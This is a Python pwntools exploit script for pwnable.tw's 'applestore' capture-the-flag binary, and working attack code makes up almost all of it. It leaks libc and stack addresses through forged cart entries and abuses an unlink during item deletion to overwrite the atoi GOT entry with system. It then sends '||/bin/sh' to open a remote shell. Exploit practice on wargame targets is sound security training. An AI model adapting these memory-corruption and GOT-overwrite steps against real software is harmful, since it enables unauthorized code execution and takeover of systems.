from pwn import *

context(terminal = ['deepin-terminal','-x','sh','-c'],log_level = 'debug',arch = 'i386',os = 'linux')


debug = 0
ElfPath = './applestore'
LibcPath = './libc_32.so.6'
RemoteAddr = 'chall.pwnable.tw'
RemotePort = '10104'

elf = ELF(ElfPath)
if debug:
    sh = process(ElfPath)
    libc = elf.libc
else:
    sh = remote(RemoteAddr,RemotePort)
    if LibcPath:
       libc = ELF(LibcPath)

def add(choice):
    sh.sendlineafter('> ','2')
    sh.sendlineafter('Number> ',str(choice))

def delete(choice):
    sh.sendlineafter('> ','3')
    sh.sendlineafter('Number> ',str(choice))

def cart(choice):
    sh.sendlineafter('> ','4')
    sh.sendlineafter('> ',str(choice))

def checkout(choice):
    sh.sendlineafter('> ','5')
    sh.sendlineafter('> ',str(choice))

def my_read(choice):
    sh.sendlineafter('> ',str(choice))

for i in range(0,16):
    add(5)
for i in range(0,10):
    add(4)
checkout('y')

puts_got = elf.got['puts']
payload = 'y ' + p32(puts_got) + p32(puts_got)
cart(payload)
sh.recvuntil('27: ')
libc_base = u32(sh.recv(4)) - libc.symbols['puts']
environ_addr = libc_base + libc.symbols['environ']

log.info('-------->{:#X}'.format(libc_base))

payload = 'y' + ' ' + p32(environ_addr) + p32(environ_addr)
cart(payload)
sh.recvuntil('27: ')
stack_addr = u32(sh.recv(4))
ofst = 0xa9c - 0x998
ebp_addr = stack_addr - ofst
atoi_got = elf.got['atoi']

log.info('-------->{:#X}'.format(ebp_addr))
if debug:
    gdb.attach(sh)
payload = '27' + p32(0) + p32(0) + p32(ebp_addr - 0xc) + p32(atoi_got + 0x22)
delete(payload)

system_addr = libc_base + libc.symbols['system']
payload = p32(system_addr) + '||/bin/sh'
my_read(payload) 

sh.interactive()
sh.close()
